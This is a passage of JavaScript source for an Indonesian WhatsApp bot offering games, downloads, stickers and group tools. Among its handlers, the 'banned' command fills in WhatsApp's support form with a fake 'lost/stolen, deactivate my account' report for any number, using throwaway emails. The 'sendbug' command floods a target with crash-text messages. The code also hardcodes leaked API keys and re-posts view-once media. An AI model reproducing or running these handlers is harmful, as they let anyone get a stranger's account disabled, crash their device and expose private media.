var alasanban = `-`
if (banned == true) {
var alasanban = alasanbanned
}

try {
let bio_nya =  await conn.fetchStatus(m.sender)
bio = `${bio_nya.status}`
} catch {
bio = `-`
}

const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `*_${ucapanWaktu}, ${nama}_*`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./undefined.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}


var bioorg = `-`
if (registered == true) {
var bioorg = bio;
}

/* if (budy && reaction(budy)){
conn.sendMessage(m.chat, {
          react: {
            text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
            key: m.key,
          }})
}
*/

async function verifikasi(pengirim, nama, token, opsional) {
datot = `「 *VERIFIKASI* 」

Halo, ${nama}
Kode verifikasi anda adalah:

*${token}*
`
await conn.sendMessage(pengirim, {text: datot }, opsional)
}

if (db.data.users[m.sender].Banneduser) {
if (db.data.chats[m.chat].antiviewonce) {
if (m.mtype == 'viewOnceMessageV2') {
        let msg = m.message.viewOnceMessageV2.message
        let type = Object.keys(msg)[0]
        let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
        let buffer = Buffer.from([])
        wasu = msg[type].caption
            
            data = `「 *ANTI VIEWONCE MESSAGE* 」
      
📛 *Name* : ${nama}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${wib()} WIB
✍️ *MessageType* : viewOnceMessageV2
💬 *Caption* : ${wasu ? '' + wasu : 'No caption'}
`
data1 = data.trim()
await conn.sendTextWithMentions(m.chat, data1, m)
        for await (const chunk of media) {
        	buffer = Buffer.concat([buffer, chunk])
        }
        if (/video/.test(type)) {
            return await conn.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
        } else if (/image/.test(type)) {
            return await conn.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
        }
    }
}
}


//━━━━━━━━━━━━━━━[ COMMAND ]━━━━━━━━━━━━━━━━━//
 
switch (command) {
case 'menu': {
usertod = db.data.users[m.sender]
let { min, max, xp } = levelling.xpRange(usertod.level, global.multiplier)
var exporg = `-`
if (registered == true) {
var exporg = `${usertod.exp - min}/${xp}`
}
anuy = `━━[ *USER INFORMATION* ]━━

▢ *Name*: ${nama}
▢ *Bio* : ${bioorg}
▢ *Registered*: ${titit}
▢ *Limit*: ${limitnya}
▢ *Role*: ${rolenya}
▢ *Money*: Rp: ${duitorg}
▢ *Bank*: Rp: ${ateem}
▢ *Level*: ${levelorang}
▢ *Exp*: ${exporg}
▢ *Status*: ${premiumnya}
▢ *Banned*: ${bannedorg}
▢ *Alasan Ban*: ${alasanban}

━━[ *TIME INFORMATION* ]━━

⏰ *WIB*: ${wib()}
⏰ *WITA*: ${wita()}
⏰ *WIT*: ${wit()}

━━[ *DATE INFORMATION* ]━━

📆 Hari : ${week} ${weton}
📆 Tanggal : ${tanggal()}

━━━━━[ *COMMAND* ]━━━━━━

</> *Sticker Menu* </>

⭔ ${prefix}sticker
⭔ ${prefix}toimage
⭔ ${prefix}ttp
⭔ ${prefix}smeme
⭔ ${prefix}semoji
⭔ ${prefix}gura
⭔ ${prefix}doge
⭔ ${prefix}emojimix

</> *News Menu* </>

⭔ ${prefix}infogempa
⭔ ${prefix}liputan6
⭔ ${prefix}detiknews
⭔ ${prefix}trendtwit
⭔ ${prefix}inews

</> *Primbon Menu* </>

⭔ ${prefix}artimimpi
⭔ ${prefix}ramalanpekerjaan
⭔ ${prefix}artinama
⭔ ${prefix}kecocokannama
⭔ ${prefix}kecocokanpasangan
⭔ ${prefix}jadianpernikahan
⭔ ${prefix}ramalancinta
⭔ ${prefix}ramalanjodohbali
⭔ ${prefix}suamiistri
⭔ ${prefix}sifatusaha
⭔ ${prefix}rezeki
⭔ ${prefix}pekerjaan
⭔ ${prefix}potensipenyakit
⭔ ${prefix}artitarot
⭔ ${prefix}fengshui
⭔ ${prefix}harisangar
⭔ ${prefix}harinaas
⭔ ${prefix}nagahari
⭔ ${prefix}arahrezeki
⭔ ${prefix}peruntungan
⭔ ${prefix}wetonjawa
⭔ ${prefix}karakter
⭔ ${prefix}keberuntungan
⭔ ${prefix}memancing
⭔ ${prefix}masasubur
⭔ ${prefix}zodiak
⭔ ${prefix}shio

</> *Search Menu* </>

⭔ ${prefix}pinterest
⭔ ${prefix}ytsearch
⭔ ${prefix}linkwa
⭔ ${prefix}liriklagu
⭔ ${prefix}googleimage
⭔ ${prefix}brainly
⭔ ${prefix}wikipedia
⭔ ${prefix}google
⭔ ${prefix}wikimedia
⭔ ${prefix}wallpaper
⭔ ${prefix}kbbi

</> *Tools Menu* </>

⭔ ${prefix}tinyurl
⭔ ${prefix}githubstalk
⭔ ${prefix}ocr
⭔ ${prefix}translate
⭔ ${prefix}readmore
⭔ ${prefix}ebinary
⭔ ${prefix}dbinary
⭔ ${prefix}kalkulator
⭔ ${prefix}removebg
⭔ ${prefix}tourl
⭔ ${prefix}tanya
⭔ ${prefix}telegraph
⭔ ${prefix}ssweb
⭔ ${prefix}styletext
⭔ ${prefix}ringtone
⭔ ${prefix}tts
⭔ ${prefix}toaudio
⭔ ${prefix}bass
⭔ ${prefix}blown
⭔ ${prefix}deep
⭔ ${prefix}earrape
⭔ ${prefix}fast
⭔ ${prefix}fat
⭔ ${prefix}nightcore
⭔ ${prefix}reverse
⭔ ${prefix}robot
⭔ ${prefix}slow
⭔ ${prefix}tupai
⭔ ${prefix}namaninja
⭔ ${prefix}bahasapurba

</> *Downloader Menu* </>

⭔ ${prefix}ytmp3
⭔ ${prefix}ytmp4
⭔ ${prefix}tiktok
⭔ ${prefix}gitclone

</> *Group Menu* </>

⭔ ${prefix}vote
⭔ ${prefix}upvote
⭔ ${prefix}devote
⭔ ${prefix}delvote
⭔ ${prefix}cekvote
⭔ ${prefix}nsfw
⭔ ${prefix}antitoxic
⭔ ${prefix}antilink
⭔ ${prefix}antiviewonce
⭔ ${prefix}simi
⭔ ${prefix}listonline
⭔ ${prefix}setsubject
⭔ ${prefix}editinfo
⭔ ${prefix}setppgrup
⭔ ${prefix}tagall
⭔ ${prefix}hidetag
⭔ ${prefix}add
⭔ ${prefix}promote
⭔ ${prefix}demote
⭔ ${prefix}revoke
⭔ ${prefix}tagme
⭔ ${prefix}listadmin
⭔ ${prefix}group
⭔ ${prefix}setdesc
⭔ ${prefix}linkgroup
⭔ ${prefix}ephemeral

</> *Anime Menu* </>

⭔ ${prefix}neku
⭔ ${prefix}neko
⭔ ${prefix}waifu
⭔ ${prefix}trap
⭔ ${prefix}loli
⭔ ${prefix}shinobu
⭔ ${prefix}megumin
⭔ ${prefix}ahegao
⭔ ${prefix}bdsm
⭔ ${prefix}ass
⭔ ${prefix}blowjob
⭔ ${prefix}boobjob
⭔ ${prefix}creampie
⭔ ${prefix}cuckold
⭔ ${prefix}cum
⭔ ${prefix}elves
⭔ ${prefix}ero
⭔ ${prefix}femdom
⭔ ${prefix}foot

</> *Random Menu* </>

⭔ ${prefix}cosplay
⭔ ${prefix}katabucin
⭔ ${prefix}katabijak
⭔ ${prefix}darkjoke
⭔ ${prefix}quotesanime
⭔ ${prefix}ppcouple
⭔ ${prefix}quotes
⭔ ${prefix}bird
⭔ ${prefix}cat
⭔ ${prefix}dog
⭔ ${prefix}fox
⭔ ${prefix}panda
⭔ ${prefix}raccoon
⭔ ${prefix}redpanda
⭔ ${prefix}koala
⭔ ${prefix}kangaroo
⭔ ${prefix}coffe
⭔ ${prefix}wallpaperml
⭔ ${prefix}apakah
⭔ ${prefix}kapankah
⭔ ${prefix}bisakah
⭔ ${prefix}bagaimanakah
⭔ ${prefix}joke

</> *Maker Menu* </>

⭔ ${prefix}firework
⭔ ${prefix}qrcode
⭔ ${prefix}tahta
⭔ ${prefix}logo
⭔ ${prefix}logo1
⭔ ${prefix}logo2
⭔ ${prefix}logo3
⭔ ${prefix}logo4
⭔ ${prefix}logo5
⭔ ${prefix}patrick
⭔ ${prefix}xnxx
⭔ ${prefix}horny
⭔ ${prefix}thunder
⭔ ${prefix}triggered
⭔ ${prefix}jojo
⭔ ${prefix}spongebob
⭔ ${prefix}lukis
⭔ ${prefix}igmaker
⭔ ${prefix}blur
⭔ ${prefix}batslap
⭔ ${prefix}beautiful
⭔ ${prefix}facepalm
⭔ ${prefix}gay
⭔ ${prefix}rip
⭔ ${prefix}trash
⭔ ${prefix}greyscale
⭔ ${prefix}sepia
⭔ ${prefix}invert
⭔ ${prefix}deletemaker
⭔ ${prefix}triger
⭔ ${prefix}hitler
⭔ ${prefix}wanted
⭔ ${prefix}jail
⭔ ${prefix}dither
⭔ ${prefix}circle

</> *Game Menu* </>

⭔ ${prefix}truth
⭔ ${prefix}dare
⭔ ${prefix}tictactoe
⭔ ${prefix}delttt
⭔ ${prefix}halah
⭔ ${prefix}hilih
⭔ ${prefix}huluh
⭔ ${prefix}heleh
⭔ ${prefix}holoh
⭔ ${prefix}cekmati
⭔ ${prefix}persenganteng
⭔ ${prefix}persencantik
⭔ ${prefix}sangecek
⭔ ${prefix}persengay
⭔ ${prefix}kerangajaib
⭔ ${prefix}cekme
⭔ ${prefix}jadian
⭔ ${prefix}jodohku

</> *RPG Menu* </>

⭔ ${prefix}slot
⭔ ${prefix}buylimit
⭔ ${prefix}leaderboard
⭔ ${prefix}levelup
⭔ ${prefix}rename
⭔ ${prefix}dailyrewards
⭔ ${prefix}my
⭔ ${prefix}simpanuang
⭔ ${prefix}progres
⭔ ${prefix}resetuang
⭔ ${prefix}narik
⭔ ${prefix}tomoney
⭔ ${prefix}ojek

</> *Anonymous Menu* </>

⭔ ${prefix}anonymous
⭔ ${prefix}start
⭔ ${prefix}next
⭔ ${prefix}leave

</> *Main Menu* </>

⭔ ${prefix}menu
⭔ ${prefix}signup
⭔ ${prefix}signin
⭔ ${prefix}logout
⭔ ${prefix}report
⭔ ${prefix}afk
⭔ ${prefix}setcmd
⭔ ${prefix}delcmd
⭔ ${prefix}listcmd
⭔ ${prefix}delete
⭔ ${prefix}donasi
⭔ ${prefix}owner
⭔ ${prefix}fetch
⭔ ${prefix}ping
⭔ ${prefix}infochat
⭔ ${prefix}reaction
⭔ ${prefix}readviewonce
⭔ ${prefix}q

</> *Owner Menu* </>

⭔ ${prefix}nano
⭔ ${prefix}listgc
⭔ ${prefix}listpc
⭔ ${prefix}leavegc
⭔ ${prefix}join
⭔ ${prefix}eval
⭔ ${prefix}broadcast
⭔ ${prefix}setinformasi
⭔ ${prefix}setppbot
⭔ ${prefix}setbiobot
⭔ ${prefix}setwebsite
⭔ ${prefix}setpanel
⭔ ${prefix}setowner
⭔ ${prefix}ban
⭔ ${prefix}unban
⭔ ${prefix}self
⭔ ${prefix}public
⭔ >
⭔ $

━━━[ *BOT INFORMATION* ]━━━

👑 Creator : WandyGans
🤖 Bot Name : Zero - Bot
📍 Prefix : 「 Multi Prefix 」
🌝 Hit Today : ${hit_today.length}
🌎 Hit All : ${commandall}
🌐 Website: ${website}
🌐 Panel: ${panel}
📶 Speed : ${sped.toFixed(4)} _Second_
⌛ Server Uptime: 
${runtime(process.uptime())}

━━━━━[ *PRICE* ]━━━━━━━

*🔖SewaBot🔖*

- *1 bulan = 10K*
- *2 bulan = 15k*
- *3 bulan = 17k*

*🔖Up to Premium🔖*
*Unlimited limit = 10K*


*_Special thanks for user👋_*
`
conn.sendTextWithMentions(m.chat, anuy, m)
//await conn.sendMessage(m.chat, { image: await conn.resize(await ppwa(conn, m), 300, 180), caption: anuy }, { quoted: fakestatus })
}
break
case 'banned': {
if (!isCreator) return
  let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
case 'transferuang': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
let [jumlah, tagnya] = text.split`,`
asu = "@s.whatsapp.net"
if (db.data.users[m.sender].money < jumlah) return m.reply(`Uang anda tidak cukup untuk transfer!`)
if (db.data.users[tagnya + asu].registered) return m.reply(`Dia belum terdaftar!`)
db.data.users[m.sender].money -= jumlah
db.data.users[tagnya + asu].money += jumlah
conn.sendTextWithMentions(m.chat, `*––––––『 TRANSFER 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* Money\n🧮 Count:* ${jumlah}\n*📨 To:* @${(tagnya || '').replace(/@s\.whatsapp\.net/g, '')}`, m)
}
break
case 'inews':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned) 
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
datae = await xfarr.information.inews()
teksss = `「 *INEWS* 」\n`
for (let i of datae) {
teksss += `\n*Title* : ${i.berita}\n*Img* : ${i.thumbnail}\n*Link* : ${i.link}\n*Info*: ${i.info_berita}\n`
}
m.reply(teksss.trim())
break
case 'cekme': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
const ganteng = ['Cakep ✅','Jelek Anjrit ❎']
const sifat = ['Pembohong','Galak','Suka Bantu Orang','Baik','Jahat:(','Bobrok','Suka BadMood','Setia','Tulus','Beriman','Penyayang Binatang','Baperan']
const suka = ['Makan','Tidur','Main Game','Sesama Jenis','Binatang',`Seseorang Yang ${conn.getName(m.sender)} Sukai`,'Belajar','Ibadah','Diri Sendiri']
const nomernyah = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','31','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','82','84','84','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const keberanian = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','31','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','82','84','84','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const kepinteran = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','31','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','82','84','84','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const ganz = ganteng[Math.floor(Math.random() * ganteng.length)]
const sipat = sifat[Math.floor(Math.random() * sifat.length)]
const numb = nomernyah[Math.floor(Math.random() * nomernyah.length)]
const gai = suka[Math.floor(Math.random() * suka.length)]
const berani = keberanian[Math.floor(Math.random() * keberanian.length)]
const pinter = kepinteran[Math.floor(Math.random() * kepinteran.length)]
var cek = `*[ CEK PRIBADI KAMU ]*
 
Nama : ${nama}
Sifat : ${sipat}
Keberanian : ${berani}%
Ketakutan : ${numb}%
Cakep : ${ganz}
Cek Pintar : ${pinter}%
Menyukai : ${gai}`
m.reply(cek)
}
break
case 'sendbug': {
	virtex = require('./virtek');
	if (!isCreator) return
	  if (!text) throw `uhm... siapa yg mau diserang?\n contoh penggunaan:\n *${usedPrefix + command}* nomor\n Example: *${usedPrefix + command}* 6281234567890`;
  let [orang, jumlah] = text.split(',')
  ea = await bugnomor(orang)
  if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882...., 10'
  m.reply('_sedang diproses..._')
  let who
  try {
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    else who = ea.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (who.length <= 20) throw 'balas atau tag orang yg mau di serang!';
    
    for (let i = jumlah; i > 1; i--) {
      if (i !== 0) await conn.sendMessage(who, { text: virtex }, {
        quoted: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: '0@s.whatsapp.net@broadcast'
          },
          message: {
            conversation: virtex
          }
        }
      })
    }
    m.reply(`sukses mengirim bug ke @${who.split('@')[0]}`)
  } catch (e) {
    console.error(e)
    throw e
  }
}
break
case 'enhancer': {
try {
 await m.reply('Sedang membuat...')
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) throw 'Fotonya Mana?'
  if (!/image\/(jpe?g|png)/.test(mime)) throw `Tipe ${mime} tidak didukung!`
  let img = await q.download()
  let body = new FormData
  body.append('image', img, 'image')
  let res = await fetch('http://max-image-resolution-enhancer.codait-prod-41208c73af8fca213512856c7a09db52-0000.us-east.containers.appdomain.cloud/model/predict', {
    method: 'POST',
    body
  })
  if (res.status !== 200) throw await res.json()
  await conn.sendFile(m.chat, await res.buffer(), 'Enhance.jpg', 'Nih Kak', m)
} catch (e) {
  m.reply('Ada yang Erorr!')
 }
}
break
case 'kerangajaib': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return reply(`Use example ${prefix + command} i'm alien?`)
lanangg = ['Mungkin suatu hari','Tidak juga','Tidak keduanya','Kurasa tidak','Ya','Coba tanya lagi','Tidak ada']
    lanang = pickRandom(lanangg)
    m.reply(lanang)
}
break
case 'ojek': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 160) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 160
m.reply('*160 limit terpakai*')

let order = global.db.data.users[m.sender].ojekk
let randomaku1 = `${Math.floor(Math.random() * 10)}`
let randomaku2 = `${Math.floor(Math.random() * 10)}`
let randomaku4 = `${Math.floor(Math.random() * 5)}`
let randomaku3 = `${Math.floor(Math.random() * 10)}`
let randomaku5 = `${Math.floor(Math.random() * 10)}`

.trim()

let rbrb1 = (randomaku1 * 2)
let rbrb2 = (randomaku2 * 10) 
let rbrb3 = (randomaku3 * 1)
let rbrb4 = (randomaku4 * 15729)
let rbrb5 = (randomaku5 * 120)


zero1 = `${rbrb1}`
zero2 = `${rbrb2}`
zero3 = `${rbrb3}`
zero4 = `${rbrb4}`
zero5 = `${rbrb5}`

dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🛵


✔️ Mendapatkan orderan....
`

dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Mengantar ke tujuan....
`

dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Sampai di tujuan....
`

dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️ 🚶  


➕ 💹Menerima gaji....
`

hsl = `
*—[ Hasil Ngojek ]—*

 ➕ 💹 Uang = [ ${zero4} ]
 ➕ ✨ Exp = [ ${zero5} ] 		 
 ➕ 😍 Order Selesai = +1

➕  📥Total Order Sebelumnya : ${order}

`

global.db.data.users[m.sender].money += rbrb4
global.db.data.users[m.sender].exp += rbrb5
global.db.data.users[m.sender].ojekk += 1


setTimeout(() => {
                     m.reply(`${hsl}`)
                     }, 27000) 
               
                     setTimeout(() => {
                     m.reply(`${dimas4}`)
                      }, 25000)
                
                     setTimeout(() => {
                     m.reply(`${dimas3}`)
                     }, 20000) 
                        
                     setTimeout(() => {
                     m.reply(`${dimas2}`)
                     }, 15000) 
                    
                     setTimeout(() => {
                     m.reply(`${dimas}`)
                     }, 10000) 
                     
                     setTimeout(() => {
                     
                     
                     m.reply('🔍Mencari pelanggan.....')
                     }, 0) 
}
break
case 'addowner': {
	if (!isCreator) return reply(mess.owner)
let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text
    else who = m.chat
    if (!who) return reply(`tag orangnya!`)
    if (global.owner.includes(who.split`@`[0])) return reply('dia udah menjadi owner !')
    global.owner.push(`${who.split`@`[0]}`)
    
    conn.sendTextWithMentions(m.chat, `@${who.split`@`[0]} sekarang owner !`, m)
    }
break
case 'blur': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
m.reply(mess.wait)
try {
	let level = text || '5', img = await jimp.read(media)
	img.blur(isNaN(level) ? 5 : parseInt(level))
	img.getBuffer('image/jpeg', (err, buffer) => {
		m.reply(buffer)
	})
} catch (e) {
error(util.format(e), m, m.chat)
}
} else {
m.reply(`Kirim Gambar Dengan Caption ${prefix + command}`)
}
}
break
case 'translate': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let lang, text
	if (args.length >= 2) {
		lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
	} else if (m.quoted && m.quoted.text) {
		lang = args[0] ? args[0] : 'id', text = m.quoted.text
	} else return reply(`Ex: ${prefix + command} id hello i am robot`)
	let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
	if (!res) return reply(`Error : Bahasa"${lang}" Tidak Support`)
	m.reply(`*Terdeteksi Bahasa:* ${res.from.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
	}
break
case 'readmore':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example: ${prefix + command} angjay|mabar`)
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    m.reply(l + readMore + r)
break
case 'removebg': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
	    if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	    if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	    if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await conn.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    conn.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
case 'githubstalk': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply('Harap Masukan Username')

  await m.reply('Searching...')
  let request = await githubstalk(text) 
    let { username, following, followers, type, bio, company, blog, location, email, public_repo, public_gists, profile_pic } = request
    let thumb = await getBuffer(profile_pic)
    let hasil = `*── 「 GITHUB STALK 」 ──*
➸ *Username*: ${username}
➸ *Bio*: ${bio}
➸ *Perusahaan*: ${company}
➸ *Email:* ${email}
➸ *Blog:* ${blog}
➸ *Repo Publik:* ${public_repo}
➸ *Gists Publik:* ${public_gists}
➸ *Follower:* ${followers}
➸ *Following:* ${following}
➸ *Lokasi:* ${location}
➸ *Type:* ${type}
`

    conn.sendFile(m.chat, thumb, 'githubstalk.jpg', hasil, m)
}
break
case 'tomoney': {
const xpperlimit = 1
	let user = global.db.data.users[m.sender]
  let count = command.replace(/^tomoney/i, '')
  count = count ? /all/i.test(count) ? Math.floor(global.db.data.users[m.sender].exp / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (global.db.data.users[m.sender].exp >= xpperlimit * count) {
    global.db.data.users[m.sender].exp -= xpperlimit * count
    global.db.data.users[m.sender].money += count
    reply(`Sukses menukarkan exp sebesar ${count} Exp ✨`)
  } else reply(`[❗] Exp anda tidak mencukupi untuk ditukar sebesar ${count} ✨`)
}
break
case 'gitclone': {
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
const regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!args[0]) return reply(`Example user ${prefix + command} https://github.com/ImYanXiao/Elaina-MultiDevice`)
    if (!regex.test(args[0])) return reply('Url Tidak Valid!')
    let [_, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    m.reply(`D o w n l o a d i n g. . .`)
    conn.sendFile(m.chat, url, filename, null, m)
}
break
case 'readviewonce':{
	if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!/viewOnce/.test(m.quoted?.mtype)) return reply('Itu Bukan Pesan ViewOnce')
        let msg = m.quoted.message
        let type = Object.keys(msg)[0]
        let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
        let buffer = Buffer.from([])
            
        for await (const chunk of media) {
        	buffer = Buffer.concat([buffer, chunk])
        }
